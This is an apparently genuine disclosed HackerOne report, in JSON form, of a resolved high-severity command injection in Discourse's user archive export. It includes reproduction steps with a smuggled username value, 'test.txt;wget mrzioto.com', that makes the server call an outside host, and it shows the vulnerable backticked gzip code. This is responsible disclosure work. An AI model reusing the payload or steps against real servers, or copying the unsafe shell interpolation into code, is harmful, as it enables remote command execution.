{"id":214022,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQwMjI=","url":"https://hackerone.com/reports/214022","title":"Admin Command Injection via username in user_archive ExportCsvFile","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-03-16T22:05:10.800Z","submitted_at":"2017-03-16T22:05:10.800Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ziot","url":"/ziot","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/262/0ae404c47a4859c97158707b8e111baf9f6193d0_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16893,"url":"https://hackerone.com/discourse","handle":"discourse","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Discourse","twitter_handle":"discourse","website":"https://discourse.org","about":"Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-05-13T21:25:53.259Z","bug_reporter_agreed_on_going_public_at":"2017-04-13T21:25:34.943Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"When a user generates a backup of their posts, their username gets sent to the `ExportCsvFile` job. The username is placed inside of a gzip command in backticks. Although the application prevents special characters in usernames, an admin is able to make modifications to the database via the restore from backup feature. This allows an admin to escalate to command injection.\n\n## Steps\n\n 1. Login as an admin on try.discourse.org, e.g.\n  * http://try.discourse.org/\n 2. Make a backup of the website and download it.\n 3. Extract the contents of the archive.\n 4. Modify one of the usernames of an account you have access to:\n  * test.txt;wget mrzioto.com\n 5. Repackage the archive.\n 6. Upload the modified archive.\n 7. Restore from backup.\n 8. Log into the account you just modified (you can login via email address, so the special characters won't prevent you from logging into it).\n 9. Send the POST request for creating a user export archive:\n  * http://34.205.246.2/export_csv/export_entity.json\n  * POST: entity_type=user\u0026entity=user_archive\n 10. ---\u003e You forced the server to make a wget leading to RCE/command injection.\n\n## Code Flow\n\n```\n      file_name_prefix = if @entity == \"user_archive\"\n        \"#{@entity.split('_').join('-')}-#{@current_user.username}-#{Time.now.strftime(\"%y%m%d-%H%M%S\")}\"\n\n      file_name = \"#{file_name_prefix}-#{file.id}.csv\"\n      absolute_path = \"#{UserExport.base_directory}/#{file_name}\"\n\n      `gzip -5 #{absolute_path}`\n```","vulnerability_information_html":"\u003cp\u003eWhen a user generates a backup of their posts, their username gets sent to the \u003ccode\u003eExportCsvFile\u003c/code\u003e job. The username is placed inside of a gzip command in backticks. Although the application prevents special characters in usernames, an admin is able to make modifications to the database via the restore from backup feature. This allows an admin to escalate to command injection.\u003c/p\u003e\n\n\u003ch2 id=\"steps\"\u003eSteps\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eLogin as an admin on try.discourse.org, e.g.\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"http://try.discourse.org/\" href=\"/redirect?url=http%3A%2F%2Ftry.discourse.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://try.discourse.org/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eMake a backup of the website and download it.\u003c/li\u003e\n\u003cli\u003eExtract the contents of the archive.\u003c/li\u003e\n\u003cli\u003eModify one of the usernames of an account you have access to:\n\n\u003cul\u003e\n\u003cli\u003etest.txt;wget mrzioto.com\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eRepackage the archive.\u003c/li\u003e\n\u003cli\u003eUpload the modified archive.\u003c/li\u003e\n\u003cli\u003eRestore from backup.\u003c/li\u003e\n\u003cli\u003eLog into the account you just modified (you can login via email address, so the special characters won\u0026#39;t prevent you from logging into it).\u003c/li\u003e\n\u003cli\u003eSend the POST request for creating a user export archive:\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"http://34.205.246.2/export_csv/export_entity.json\" href=\"/redirect?url=http%3A%2F%2F34.205.246.2%2Fexport_csv%2Fexport_entity.json\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://34.205.246.2/export_csv/export_entity.json\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003ePOST: entity_type=user\u0026amp;entity=user_archive\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e---\u0026gt; You forced the server to make a wget leading to RCE/command injection.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"code-flow\"\u003eCode Flow\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e      file_name_prefix = if @entity == \u0026quot;user_archive\u0026quot;\n        \u0026quot;#{@entity.split(\u0026#39;_\u0026#39;).join(\u0026#39;-\u0026#39;)}-#{@current_user.username}-#{Time.now.strftime(\u0026quot;%y%m%d-%H%M%S\u0026quot;)}\u0026quot;\n\n      file_name = \u0026quot;#{file_name_prefix}-#{file.id}.csv\u0026quot;\n      absolute_path = \u0026quot;#{UserExport.base_directory}/#{file_name}\u0026quot;\n\n      `gzip -5 #{absolute_path}`\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"512.0","formatted_bounty":"$512","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-05-13T21:25:34.974Z","allow_singular_disclosure_after":-114507134.36125755,"singular_disclosure_allowed":true,"vote_count":41,"voters":["ziot","hunter","iamnoooob","inhibitor181","bl4de","bogdantcaciuc","sameerphad72","yaworsk","ebrietas","flashdisk","and 31 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1546631,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-16T22:21:29.925Z","updated_at":"2017-03-16T22:21:29.925Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":31695},"actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1546632,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-16T22:21:40.552Z","updated_at":"2017-03-16T22:21:40.552Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ziot","url":"/ziot"},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1546634,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"thanks, excellent report, very detailed and complete and clear!","markdown_message":"\u003cp\u003ethanks, excellent report, very detailed and complete and clear!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-16T22:22:05.224Z","updated_at":"2017-03-16T22:22:05.224Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Discourse"}},"bounty_amount":"512.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"discourse","collaborator":{"username":"ziot","url":"/ziot"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1610600,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-13T21:25:34.958Z","updated_at":"2017-04-13T21:25:34.958Z","first_to_agree":true,"actor":{"username":"ziot","cleared":true,"url":"/ziot","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/262/0ae404c47a4859c97158707b8e111baf9f6193d0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1672267,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-13T21:25:53.287Z","updated_at":"2017-05-13T21:25:53.287Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Discourse"}},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}